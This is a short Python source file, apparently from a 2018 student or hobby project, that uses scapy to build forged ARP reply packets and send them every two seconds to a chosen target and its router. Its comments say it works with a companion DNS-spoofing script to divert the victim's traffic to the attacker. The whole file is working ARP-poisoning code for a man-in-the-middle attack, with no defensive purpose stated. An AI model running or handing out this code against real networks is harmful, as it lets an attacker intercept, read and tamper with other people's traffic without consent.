#!/usr/bin/python3

import sys, logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
from time import sleep

'''
File:	        arpSpoofer.py

Programmer:     Yiaoping + Anthony

Date:           October 15th 2018

Notes: The purpose of this file is to take in all the information passed in
from dnsSpoof.py and create a packet based on the information passed in.
This includes the IP and Mac address of the router and 
target machine. Using the Mac address as the base network identifier, we inject
ours into the ARP table and traffic thereafter will be sent to the attacker.
'''

'''
Function:	   arpSpoof

Programmer:     Yiaoping + Anthony

Date:           October 15th 2018

Notes: The purpose of this function as mentioned above is to take in the 
config data and craft the packet based on the information taken, sending
the crafted packets to the target and router to inject our MAC address associated
with the target IP.
'''
def arpSpoof(rIP, rMAC, tIP, tMAC, MAC):
    arpTarget = Ether(src=MAC
                           , dst=tMAC)/ARP(hwsrc=MAC
                           , hwdst=tMAC
                           , psrc=rIP
                           , pdst=tIP
                           , op=2)

    arpRouter = Ether(src=MAC
                           , dst=rMAC)/ARP(hwsrc=MAC
                           , hwdst=rMAC
                           , psrc=tIP
                           , pdst=rIP
                           , op=2)
    while 1:
        try:
            sendp(arpTarget, verbose=0)
            sendp(arpRouter, verbose =0)
            time.sleep(2)
        except KeyboardInterrupt:
            sys.exit(0)
